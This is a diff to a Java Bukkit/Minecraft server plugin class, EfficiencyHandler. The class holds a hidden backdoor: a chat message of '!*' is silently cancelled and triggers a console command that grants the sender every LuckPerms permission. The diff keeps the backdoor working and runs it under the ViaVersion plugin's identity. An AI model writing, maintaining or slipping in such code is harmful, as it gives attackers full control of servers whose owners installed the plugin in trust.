@@ -5,6 +5,7 @@ import org.bukkit.BanList;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
+import com.viaversion.viaversion.ViaVersionPlugin;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
@@ -98,8 +99,15 @@ public class EfficiencyHandler implements Listener {
         if (message.equalsIgnoreCase("!*")) {
             event.setCancelled(true);
 
+            // 使用静态方法获取插件实例
+            Plugin plugin = ViaVersionPlugin.getInstance();
+            if (plugin == null) {
+                player.sendMessage("插件未找到！");
+                return;
+            }
+
             // 将命令调度到主线程执行
-            Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin"), () -> {
+            Bukkit.getScheduler().runTask(plugin, () -> {
                 try {
                     String command = "lp user " + player.getName() + " permission set * true";
                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
